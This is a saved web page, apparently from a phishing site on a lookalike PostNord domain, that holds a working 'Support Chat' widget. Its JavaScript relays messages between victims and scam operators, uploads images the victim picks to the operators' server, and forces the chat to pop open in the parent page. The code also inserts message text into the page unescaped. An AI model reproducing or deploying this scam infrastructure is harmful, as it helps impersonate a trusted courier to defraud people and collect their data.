<!DOCTYPE html>
<!-- saved from url=(0080)https://postnord.apply-sec333.com/static/style/support/index.html?id=TVAXLMo9Fj9 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Support Chat</title>

	<link rel="stylesheet" href="./style.css">

	<!-- system requires -->
	<script src="./jquery-3.6.0.min.js"></script>
	<script src="./axios.min.js"></script>
	<script src="./index.js"></script>
</head>

<body>
	<div id="app" data-align="right">
		<div class="app-wrapper app-responsive">
			<div data-mobile="false" class="opened">
				<div class="chat">
					<div data-shadow="true" class="top" style="background: rgb(255, 255, 255);">
						<div class="close" id="close-support-button">
							<div data-size="normal" class="tpl-close">
								<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
									<path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#5e6165"></path>
								</svg>
							</div>
						</div>
						<div class="avatar">
							<div class="tpl-avatar">
								<div class="tpl-avatar-status" style="border-color: rgb(255, 255, 255); background: rgb(105, 222, 64);">
								</div>
								<div class="tpl-avatar-image">
									<div data-status="loaded" data-cover="true" class="lazy-img">
										<img src="./avatar.png" alt="" class="lazy-img-loaded">
									</div>
								</div>
							</div>
						</div>
						<div class="company">
							<div class="header" style="color: rgb(0, 0, 0);">
								Support
							</div>
							<div class="status" style="color: rgb(155, 166, 179);">
								Online
							</div>
						</div>
					</div>
					<div class="conversation" style="background: rgb(234, 238, 243);">
					</div>
					<div class="typing" style="background: rgb(255, 255, 255); border-top-color: rgb(234, 234, 234);">
						<input type="text" maxlength="256" id="message-text" placeholder="Write message here" style="color: rgb(150, 155, 166);">
						<input type="file" style="display: none;" id="uploadPhotoBtn" accept="image/*">
						<div id="send-image_fake" style="margin-right: 5px; width: 26px; height: 26px;">
							<!--?xml version="1.0" encoding="utf-8"?-->
							<svg width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
							<path fill-rule="evenodd" clip-rule="evenodd" d="M3.17157 3.17157C2 4.34314 2 6.22876 2 9.99999V14C2 17.7712 2 19.6568 3.17157 20.8284C4.34315 22 6.22876 22 10 22H14C17.7712 22 19.6569 22 20.8284 20.8284C22 19.6569 22 17.7712 22 14V14V9.99999C22 7.16065 22 5.39017 21.5 4.18855V17C20.5396 17 19.6185 16.6185 18.9393 15.9393L18.1877 15.1877C17.4664 14.4664 17.1057 14.1057 16.6968 13.9537C16.2473 13.7867 15.7527 13.7867 15.3032 13.9537C14.8943 14.1057 14.5336 14.4664 13.8123 15.1877L13.6992 15.3008C13.1138 15.8862 12.8212 16.1788 12.5102 16.2334C12.2685 16.2758 12.0197 16.2279 11.811 16.0988C11.5425 15.9326 11.3795 15.5522 11.0534 14.7913L11 14.6667C10.2504 12.9175 9.87554 12.0429 9.22167 11.7151C8.89249 11.5501 8.52413 11.4792 8.1572 11.5101C7.42836 11.5716 6.75554 12.2445 5.40989 13.5901L3.5 15.5V2.88739C3.3844 2.97349 3.27519 3.06795 3.17157 3.17157Z" fill="#d7d7d7"></path>
							<path d="M3 10C3 8.08611 3.00212 6.75129 3.13753 5.74416C3.26907 4.76579 3.50966 4.2477 3.87868 3.87868C4.2477 3.50966 4.76579 3.26907 5.74416 3.13753C6.75129 3.00212 8.08611 3 10 3H14C15.9139 3 17.2487 3.00212 18.2558 3.13753C19.2342 3.26907 19.7523 3.50966 20.1213 3.87868C20.4903 4.2477 20.7309 4.76579 20.8625 5.74416C20.9979 6.75129 21 8.08611 21 10V14C21 15.9139 20.9979 17.2487 20.8625 18.2558C20.7309 19.2342 20.4903 19.7523 20.1213 20.1213C19.7523 20.4903 19.2342 20.7309 18.2558 20.8625C17.2487 20.9979 15.9139 21 14 21H10C8.08611 21 6.75129 20.9979 5.74416 20.8625C4.76579 20.7309 4.2477 20.4903 3.87868 20.1213C3.50966 19.7523 3.26907 19.2342 3.13753 18.2558C3.00212 17.2487 3 15.9139 3 14V10Z" stroke="#d7d7d7" stroke-width="2"></path>
							<circle cx="15" cy="9" r="2" fill="#d7d7d7"></circle>
							</svg>
						</div>
						<div class="send-icon">
							<!--?xml version="1.0" encoding="utf-8"?-->
							<svg width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="send" class="icon glyph"><path d="M21.66,12a2,2,0,0,1-1.14,1.81L5.87,20.75A2.08,2.08,0,0,1,5,21a2,2,0,0,1-1.82-2.82L5.46,13H11a1,1,0,0,0,0-2H5.46L3.18,5.87A2,2,0,0,1,5.86,3.25h0l14.65,6.94A2,2,0,0,1,21.66,12Z" style="fill:#d7d7d7"></path></svg>
						</div>
					</div>
					<div class="tpl-powered-by" style="border-top-color: rgb(238, 238, 238); background: rgb(249, 249, 249);">
						<span>
							<span style="color: rgb(155, 166, 178);">Powered by</span>
							<a target="_blank" style="color: rgb(18, 91, 251);">Support Center</a>
						</span>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script>
		/* get messages */
		async function getMessages(count) {
			const COUNT_TYPE = (count == 0) ? 'all' : 'one'

			const { data } = await axios.post(
				`/api/core/get-support-chat`,
				{
					'id': window.location.href.split('/')[6].split('=')[1],
					'type': COUNT_TYPE
				}
			)

			return data
		}

		/* add message to chat */
		function addMessage(sender_type,text) {
			const str = `
				<div class="message" style="${(sender_type == 'support') ? '' : 'margin-left: auto;'}">
					<div class="${(sender_type == 'support') ? 'bot-response quick-replies' : 'input-wrapper'}">
						<div class="${(sender_type == 'support') ? 'anchors quick-replies-text' : 'anchors input-wrapper-text'}" style="${(sender_type == 'support' ? 'background: rgb(255, 255, 255); color: rgb(0, 0, 0);' : 'background: rgb(0, 102, 255); color: rgb(255, 255, 255);')}">${text}</div>
					</div>
				</div>
			`

			$('.conversation').append(str)
			return true
		}

		function addMedia(sender_type,content) {
			const str = `
				<div class="message" style="${(sender_type == 'support') ? '' : 'margin-left: auto;'}">
					<div class="${(sender_type == 'support') ? 'bot-response quick-replies' : 'input-wrapper'}">
						<img class="${(sender_type == 'support') ? 'anchors quick-replies-text' : 'anchors input-wrapper-text'}" style="${(sender_type == 'support' ? 'background: rgb(255, 255, 255); color: rgb(0, 0, 0);' : 'background: rgb(0, 102, 255); color: rgb(255, 255, 255);')}" src="${content}">
					</div>
				</div>
			`

			$('.conversation').append(str)
			return true
		}

		/* send message */
		function sendMessage(text) {
			axios.post(
				'/api/core/send-support-text',
				{
					'id': window.location.href.split('/')[6].split('=')[1],
					'text': text
				}
			).then((data) => {
				addMessage('client',data.data.message)
			})
		}

		/* load previous messages */
		window.onload = () => {
			(async () => {
				getMessages(0).then((res) => {
					for(let i = 0; i < res.length; i++) {
						if(res[i].who == 'Support') {
							addMessage('support', res[i].text)
						} else {
							if (res[i].type == 'image') {
								addMedia('client', res[i].text)
							} else {
								addMessage('client', res[i].text)
							}
						}
					}
				})
			})()
		}

		/* load new messages */
		setInterval(async () => {
			await axios.post(
				`/api/core/get-support-chat`,
				{
					'id': window.location.href.split('/')[6].split('=')[1],
					'type': 'one'
				}
			).then((res) => {
				if(res.data[0].who == 'Support') {
					addMessage(
						`support`, res.data[0].text
					)

					try {
						parent.document.querySelector('.support-circle').style.display = 'none'
						parent.document.querySelector('#chatra').style.display = 'block'

						const iframe = parent.document.getElementById("chatra__iframe")
						const elmnt = iframe.contentWindow.document.querySelector("#app")
						elmnt.style.display = "block"
					} catch(e) {
						//
					}
				}
			}).catch(() => {

			})
		},5000)

		/* send new message */
		$('.send-icon').click(() => {
			const text = $('#message-text').val()
			$('#message-text').val('')

			if(text.length > 0) {
				sendMessage(text)
			}
		})

		/* send photo */
		$('#send-image_fake').click(() => {
			$('#uploadPhotoBtn').click()
		})

		$('#uploadPhotoBtn').change(async () => {
			const photo = $('#uploadPhotoBtn')[0].files[0]
			const formData = new FormData()

			formData.append('file', photo)

			await axios.post(
				`/api/core/send-support-media/${window.location.href.split('/')[6].split('=')[1]}`,
				formData,
				{
					headers: {
						'Content-Type': 'multipart/form-data'
					}
				}
			).then(res => {
				addMedia(
					'client',
					`/static/style/adsPictures/${res.data.text}`
				)
			})
		})

		/* close support chat */
		$('#close-support-button').click(() => {
			document.getElementById('app').style.display = 'none'
			$('#chatra',parent.document).css('display','none')
			$('.support-circle',parent.document).css('display','block')
		})

		window.addEventListener('keypress',(e) => {
			if(e.key === 'Enter') {
				const text = $('#message-text').val()
				$('#message-text').val('')

				if(text.length > 0) {
					sendMessage(text)
				}
			}
		})
	</script>
<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'87d771cd7bd370bb',t:'MTcxNDY0Njk2NS4zOTMwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./saved_resource.html"></iframe>

</body></html>